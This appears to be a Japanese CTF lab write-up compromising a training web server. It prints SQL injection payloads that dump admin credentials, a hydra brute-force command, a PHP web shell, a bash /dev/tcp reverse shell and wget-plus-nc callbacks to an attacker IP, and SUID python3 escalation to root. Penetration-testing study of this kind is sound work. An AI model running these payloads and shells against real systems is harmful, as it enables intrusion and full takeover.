# 鬼ヶ島攻略記
  
<br>
  
## nmap
きっかけを掴むために、まずはnmap実行  
webが動いていてることを確認
```c
┌──(kali㉿kali)-[~]
└─$ nmap -A 172.20.15.115
Starting Nmap 7.92 ( https://nmap.org ) at 2024-07-03 09:54 JST
Nmap scan report for 172.20.15.115
Host is up (0.021s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:25:b7:87:02:bd:9c:f2:77:9c:a5:61:fe:bd:ca:76 (ECDSA)
|_  256 23:ad:03:97:12:fb:13:d6:6d:71:6f:51:39:d1:c7:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: \xE7\xA4\xBE\xE5\x93\xA1\xE6\xA4\x9C\xE7\xB4\xA2\xE3\x82\xB5\xE3\x83\xBC\xE3\x83\x93\xE3\x82\xB9
|_http-server-header: Apache/2.4.58 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.59 seconds

```
  
<br>
  
## gobuster
ブラウザから当該Webサイトにアクセス。きじはケンケン鳴くことを確認した。  
`form`タグがあって`submit`できる仕様になっており、従業員を検索できるサービスっぽい。  
検索してみるとURIが`http://172.20.15.115/?id=1`となり、サーバーも`Apache`なので、おそらくwebサービスの設計は`LAMP`と当てを付ける  
`sqlインジェクション`などのWeb設計に係る脆弱性を試すか、`metasploit`で戦えるなら一気にたたみかけるかなど考えたが、ひとまず`gobuster`でwebサイトの構造を確認してみることにした。  
wordlistは、betterに`common.txt`にした  

```c
┌──(kali㉿kali)-[~]
└─$ gobuster dir --url http://172.20.15.115:80 --wordlist /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.20.15.115:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2024/07/03 10:08:13 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/css                  (Status: 301) [Size: 312] [--> http://172.20.15.115/css/]
/images               (Status: 301) [Size: 315] [--> http://172.20.15.115/images/]
/index.php            (Status: 200) [Size: 6578]                                  
/manage               (Status: 301) [Size: 315] [--> http://172.20.15.115/manage/]
/server-status        (Status: 403) [Size: 278]                                   
                                                                                  
===============================================================
2024/07/03 10:08:23 Finished
===============================================================
```
  
`manage`というページを発見しアクセスしてみる。  
すると、管理者ログインページに遷移した。ここからきっかけを掴みたいと考える  
  
<br>
  
## パスワードクラック
`hydra`でユーザ名含めて総当たりってどんくらい時間かかるかな？  
それなら`sqlインジェクション`であたりが付くか試した方がよいかな？  
なんて考えてユーザIDのフォームを押下したら、履歴に`@dmin@dmin@min`とでてきた。  
**胡散臭すぎやしねぇかい**。  
ついべらんめえ口調になるぐらい罠感が半端ない。  
・・・が、`splインジェクション`が苦手な当方としては、これで当てが付くならとりあえずやってみようとおもい`hydra`を実行  
・・・・・・１、２、ぽかん。  
**ユーザIDの履歴ってブラウザが保持してるもんじゃね？**  
そもそも`web技術`を突きつめて勉強してこなかった弊害がここで露呈。慣れもあるかもしんないが、こういう細かいハズイことが結構ある。  
とはいえ実行したので、それはそれとして記しておく
```c
hydra -f -l @dmin@dmin@dmin -P /usr/share/wordlists/rockyou.txt 172.20.15.115 http-post-form '/manage/:user=^USER^&password=^PASS^&login=login:パスワードを入力してください'
```
  
実は当初webのフォームに対する`hydra`の実行の仕方を分かっておらず、以下の方法で実行していた。  
```c
hydra -l @dmin@dmin@dmin -P /usr/share/wordlists/rockyou.txt http://172.20.15.115/manage/
```
  
これじゃダメなのね。`http-post-form`てのをつけると、フォームに対してPOSTを投げるみたいなオプションが付加されるっぽい  
だから`POSTリクエストのデータフォーマット`を確認して、それに合わせる形で投げないといけないみたいだった。勉強になった。  
  
<br>
  
まぁ実行したものの、`hydra`じゃもううまくいかんだろうから、`sqlインジェクション`を試すしかないと諦める。  
  
<br> 
  
### マジ嫌いなSQLインジェクション
いつまで経っても覚えられんSQL構文。  
スキーマからテーブルとカラム名取れればいいんだろうと思って色々試行。  
カラム数合わせるのと、データ型合わせるの忘れないように注意する。  
取りあえず色々やってみてぴったりハマったのが以下の入力値。  
`' OR 'a' = 'a' UNION SELECT null,null,TABLE_NAME,COLUMN_NAME,null FROM INFORMATION_SCHEMA.COLUMNS ;`    
`' OR 'a' = 'a' UNION SELECT null,null,name,password,null FROM admin_users ;`
  
これで管理者アカウントを`kibi-dango`:`z7ZDTyVa9L#9Yg`と特定  
忘れてたけど、まず`UNION`で適当に入力してみて、出力されずもエラーにならなかったのでいけると判断した。
  
<br>
  
## リバースシェル
無事管理者でログインできたので、次の一手を考える。  
まぁなんとなくファイルをアップロードができるようなので、`nc.exe`みたいなリバースシェルに使えそうなのを上げてどうにか起動できればいいかなと思料  
ここまで考えて戦略を整理  
- webshellを設置する
- ncの実行体を配送
- webshllからncを実行
- shellをとる
  
<br>
  
そんなこんな思案していたら、  

================　状況終了 ================  
  
<br>  
  
## その後
Webshellのphpをアップロードすることが思いのほか容易に実行できたが、それをどこで動かせばよいのかが分からなかった。  
一番の勘違いは、`burpsuite`でアップデート先を確認した際に、見つけた`name`のところである
```c
------WebKitFormBoundary4kelxNTznBhFODOT

Content-Disposition: form-data; name="name"



test3

------WebKitFormBoundary4kelxNTznBhFODOT

Content-Disposition: form-data; name="job"



test3

------WebKitFormBoundary4kelxNTznBhFODOT

Content-Disposition: form-data; name="comment"



test3

------WebKitFormBoundary4kelxNTznBhFODOT

Content-Disposition: form-data; name="icon"; filename="webshell.php"

Content-Type: application/x-php



<pre><?php system($_POST["cmd"]);?></pre>
<form method="POST">
<input autofocus type="text" name="cmd">
</form>
```
上が実際にアップロードした際に取得したリクエストヘッダーだが、各フォームに送られる先の`name`がDBのカラム名と一致しており、登録した内容はDBに`insert`されるのでは？  
と思い込んでしまった。実際はそうでないらしい。登録された内容はWebサーバー側で保存され、そのファイルパスなどのメタデータがDBに登録されるという講師からの見解だった。  
そんな使い方もあるのかと。。。そのため`select`で出力するとちゃんとした内容が返ってくるのだそう。なんだかポインタみたいだな。  
  
結論は、開発者ツールなどから実際このデータがどこから読みだされているのかを、`HTMLのソースを見て確認`することが重要らしい。  
なんとも知識も知恵も足りなかったようだ。  
改めて確認してみたら、`/usercontents`というディレクトリに格納されていくのが分かった。  
実際にアクセスしてみたら、これまでアップロードしてきたファイルがどっさりのっかっていた。
  
<br>
  
## WebShell 
Webshellが使えるようになったので、若干忘れていたこともあったが、いつも通りに実行できたかな。  
```c
リモート

┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9999
listening on [any] 9999 ...

サーバー
172.20.15.115/usercontents/web1.php?cmd=bash -i >& /dev/tcp/10.15.0.6/9999 ->&1

```  
上手くいかなかったので、`nc`使ってやろうとしたけど、これもうまくいかず。  
ちょっと思案して、`/tmp`になきゃだめなんじゃね。というのと、`権限変えてなくね`と気づく。  
失敗もありつつ、実施して成功したのは以下の順序
```c
リモート
┌──(kali㉿kali)-[~/Desktop]
└─$ python -m http.server 9000　//サーバー立ち上げ
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...

サーバー
172.20.15.115/usercontents/web1.php?cmd=wget -O /tmp/nc http://10.15.0.6/nc:1234    //wgetで/tmpに配送
172.20.15.115/usercontents/web1.php?cmd=chmod 777 /tmp/nc                           //権限変更
172.20.15.115/usercontents/web1.php?cmd=/tmp/nc -nv 10.15.0.6 9999 -e /bin/bash     //接続

リモート
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9999   //待ち受け
listening on [any] 9999 ...
connect to [10.15.0.6] from (UNKNOWN) [172.20.15.115] 37990     //接続できた

python3 -c "import pty; pty.spawn('/bin/bash')"     //shell整形
bash-5.2$ find / -name user.txt 2>/dev/null         //findで検索
/var/www/user.txt                                   //発見
cat user.txt                                        //出力
flag{D0nbur4k0_D0nbur4k0}                           //get

```
実際には`nc`実行の際に`/tmp`を忘れたりして一発ではいかなかったが、流れは上記の通り  
  
<br>  
  
## SUID
ここまで来たら権限昇格しろって話しなんだろうけど、手数がないので知ってることからやるしかない。  
とはいってもSUID使ってrootになるぐらいしか思いつかなかったので、取りあえずSUIDが設定されているのを調べる
```c
find / -type f -perm -4000 2>/dev/null
/snap/snapd/21465/usr/lib/snapd/snap-confine
/snap/core18/2812/bin/mount
/snap/core18/2812/bin/ping
/snap/core18/2812/bin/su
/snap/core18/2812/bin/umount
/snap/core18/2812/usr/bin/chfn
/snap/core18/2812/usr/bin/chsh
/snap/core18/2812/usr/bin/gpasswd
/snap/core18/2812/usr/bin/newgrp
/snap/core18/2812/usr/bin/passwd
/snap/core18/2812/usr/bin/sudo
/snap/core18/2812/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2812/usr/lib/openssh/ssh-keysign
/usr/bin/su
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/fusermount3
/usr/bin/umount
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/python3.12
/usr/bin/passwd
/usr/lib/openssh/ssh-keysign
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```
明らかに怪しい`python`があるでねーか。  
・・・とはいうものの`python`コマンドでどうやってrootになるんかな？  
pythonでなんか書けってか？それともインタラクティブでなんかできるってか？  
そんな内容ならちょっと手詰まりかもしれんと思いながら、`Google`でちょっと調べてみたら、`GTFOBins`に丁度よくあった！！  
>スイド
バイナリに SUID ビットが設定されている場合、昇格された権限は削除されず、ファイル システムにアクセスしたり、SUID バックドアとして特権アクセスをエスカレートまたは維持したりするために悪用される可能性があります。 を実行するために使用される場合、デフォルトのシェルが SUID 権限で実行できるようにする Debian (<= Stretch) などのシステムでは引数をsh -p省略します。-psh
>この例では、バイナリのローカル SUID コピーを作成し、それを実行して昇格された権限を維持します。既存の SUID バイナリと対話するには、最初のコマンドをスキップし、元のパスを使用してプログラムを実行します。  
```c
sudo install -m =xs $(which python) .
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```  
  
翻訳が怪しいが、とりあえずできるか試してみよということで実行  
```c
www-data@ip-172-20-15-115:/var/www/html/usercontents$ python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
<on3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'  
# whoami
whoami
root
```
最初、コマンドを`python`で実行したら、コマンドがありませんって怒られたので、`python3`で実行したら以外にも上手くいった。  
あとはいつも通りの検索でflagを探しに行く
```c
# find / -name root.txt 2>/dev/null
find / -name root.txt 2>/dev/null
/root/root.txt
# cat /root/root.txt
cat /root/root.txt
flag{OniTaiji_Is_0ver}
```
  
==== 攻略終了 ====
  
<br>  
  
## 感想と反省
かなり課題の残るCTFだったが辛うじて攻略できた。  
前々から懸念ではあったが、Webについて知識が乏しすぎる。  
特に`webサーバ <-> HTML/PHP <-> DB`の関係については分からないことが多すぎた。  
いや実際それだけじゃない。フレームワークでよく聞く`straus`や`tomcat（これはサーバーか？）`など、あるいはこれはWebサイト制作のフレームワークなのか`wordpress`などもよくわかってない。  
もっといえば、`css`もよく知らんし、データフォーマットの`xml`や`json`などについてもよくわかっていないのだ。  
知らないことが多すぎるが、ただひとつ確信していることは、**今後ペネトレやるうえでWeb技術について知らないのは致命的**ということ。  
しかもwebが取っ掛かりになることが往々にしてあるだろうし、むしろ一番知っとかなきゃならんのではないか。  
  
あともう一点反省すべきは、権限昇格の手数があまりにも手薄ということ。  
今回は`SUID`が発端で、検索ですぐ見つけれたからいいものの、これがうまくいかなかったら本格的に詰んでたと思う。  
一機では今後戦えないだろうと感じた。  
  
何はともあれ、技術的にしらないこと、発想が思いつかないことの２点から今回もかなり苦戦した。  
あとは勉強と慣れしかないか。。。  
  
<br>
